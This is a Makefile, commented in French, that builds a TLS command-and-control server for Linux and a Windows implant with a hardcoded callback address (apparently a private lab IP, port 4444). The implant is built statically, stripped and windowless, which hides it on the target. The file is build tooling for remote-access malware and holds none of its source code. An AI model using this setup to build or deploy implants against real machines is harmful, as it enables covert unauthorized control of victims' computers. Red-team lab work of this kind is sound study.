# Makefile — C2 server (Linux) + implant (cross-compilé pour Windows)
#
# Prérequis Ubuntu :
#   sudo apt install gcc mingw-w64 libssl-dev openssl perl make -y
#
# PREMIÈRE COMPILATION DE L'IMPLANT :
#   bash setup-openssl-win.sh   ← compile OpenSSL pour Windows (une seule fois, ~3-5 min)
#   make implant C2_IP=192.168.56.104 C2_PORT=4444
#
# Cibles :
#   make server        → c2_server   (Linux, pour le C2)
#   make implant       → implant.exe (Windows, cross-compilé)
#   make all           → les deux
#   make certs         → génère les certificats (nécessite openssl)
#   make setup-win     → télécharge + compile OpenSSL pour Windows
#   make clean

CC_LINUX   = gcc
CC_WIN     = x86_64-w64-mingw32-gcc

# OpenSSL pour le serveur Linux (fourni par libssl-dev)
CFLAGS_LINUX  = -Wall -Wextra -O2
LDFLAGS_LINUX = -lssl -lcrypto

# OpenSSL pour Windows (cross-compilé via setup-openssl-win.sh)
# Stocké dans third_party/openssl-win64/ (non committé dans le repo)
OPENSSL_WIN_DIR ?= $(dir $(abspath $(lastword $(MAKEFILE_LIST))))third_party/openssl-win64
OPENSSL_WIN_INC  = $(OPENSSL_WIN_DIR)/include
OPENSSL_WIN_LIB  = $(OPENSSL_WIN_DIR)/lib

CFLAGS_WIN  = -Wall -Wextra -O2 -I$(OPENSSL_WIN_INC)
LDFLAGS_WIN = -L$(OPENSSL_WIN_LIB) -lssl -lcrypto -lws2_32 -lgdi32 -lcrypt32 -static -s -mwindows

# IP C2 hardcodée dans l'implant (modifiable au make ou dans .env).
C2_IP   ?= 192.168.56.104
C2_PORT ?= 4444

.PHONY: all server implant certs setup-win clean

all: server implant

server: c2_server.c tls.c tls.h
	$(CC_LINUX) $(CFLAGS_LINUX) -o c2_server c2_server.c tls.c $(LDFLAGS_LINUX)
	@echo "[+] c2_server compilé"

setup-win:
	@bash setup-openssl-win.sh

implant: implant.c tls.c tls.h
	@if [ ! -f "$(OPENSSL_WIN_INC)/openssl/ssl.h" ]; then \
		echo "[!] OpenSSL Windows introuvable. Lance d'abord :"; \
		echo "    make setup-win"; \
		exit 1; \
	fi
	$(CC_WIN) $(CFLAGS_WIN) \
		-DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT) \
		-o implant.exe implant.c tls.c \
		$(LDFLAGS_WIN)
	@echo "[+] implant.exe compilé (C2=$(C2_IP):$(C2_PORT))"

certs:
	@bash gen-certs.sh

clean:
	rm -f c2_server implant.exe *.o
